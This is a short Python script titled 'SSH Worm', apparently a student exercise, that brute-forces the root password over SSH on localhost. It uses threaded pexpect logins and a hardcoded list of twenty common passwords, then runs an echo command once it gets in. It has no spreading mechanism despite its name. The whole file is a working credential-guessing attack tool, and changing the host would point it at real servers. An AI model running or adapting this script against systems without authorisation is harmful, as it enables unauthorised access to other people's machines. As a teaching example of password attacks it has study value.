################################################################################
# SSH Worm
# Created by Aiden Seay, Spring 2025
################################################################################

# IMPORTS
from pexpect import pxssh
import time
import threading
from threading import BoundedSemaphore

################################################################################
# CONSTANTS
PROMPT = ['# ', '>>> ', '> ', '\$ ']
connection_lock = BoundedSemaphore(value=10) 

################################################################################
# MAIN FUNCTION

def main():

    # Define the hostname, username, and password file for SSH login
    host = "localhost"
    user = "root"

    # iterate through a set amount of passwords
    passwords = [ "123456", "password", "123456789", "12345", "12345678",
                  "qwerty", "123123", "abc123", "password1", "111111",
                  "letmein", "welcome", "admin", "monkey", "sunshine",
                  "football", "iloveyou", "1234", "1q2w3e4r", "toor" ]

    # Try each password in the list
    for password in passwords:
        
        # acquire lock so there can only be one attempt at a time
        connection_lock.acquire()

        # display message
        print(f"Attempting to login with password: {password}")

        # start the thread to attempt the login process
        threading.Thread(target=attempt_login, 
                                            args=(user, host, password)).start()

################################################################################
# SUPPORTING FUNCTIONS

def attempt_login(user, host, password):

    # set a connection lock so there can be one attempt at a time
    release = False

    # attempt login with current password
    child = connect(user, host, password, release)
    
    # check if password is correct and in ssh session
    if child:

        # display success message and test command in ssh terminal
        print(f"[+] Password found: {password}")
        send_command(child, "echo we are in!")

        # logout from the ssh session
        child.logout()

    # assume password is incorrect and display message
    else:
        print(f"[-] Failed to login with password: {password}")

    # release the connection lock after the login attempt
    connection_lock.release()

def connect(user, host, password, release):
    
    # create an instance of an ssh session
    child = pxssh.pxssh()

    # try to login using the ssh credentials
    try:
        child.login(host, user, password)
        return child

    # extract error messages
    except pxssh.ExceptionPxssh as e:

        # check if the error is because the password is wrong
        if 'refused' in str(e).lower():
            print(f"[-] Password {password} was refused.")
            return None
        
        # check if the error is because it reached the max num of connections
        elif 'read_non-blocking' in str(e).lower():
            print(f"[!] Max connections reached. Retrying password {password}.")

            # wait then try to connect again
            time.sleep(5)
            return connect(user, host, password, release)
        
        # check if the ssh session has not yet been established
        elif 'unable to obtain command prompt' in str(e).lower():
            print("[!] Sleeping to allow SSH connection to settle.")

            # wait then try to connect again
            time.sleep(1)
            return connect(user, host, password, release)
        
        # any other uncovered error messages go here
        else:
            print(f"[-] SSH login failed: {str(e)}")
            return None

def send_command(child, cmd):

    # send the command to the ssh server
    child.sendline(cmd)

    # waiting a response expecting a certain prompt type
    child.expect(PROMPT)

    # extract the output from the command and print it
    output = child.before.decode('utf-8')
    print(output)

################################################################################

if __name__ == '__main__':
    main()

################################################################################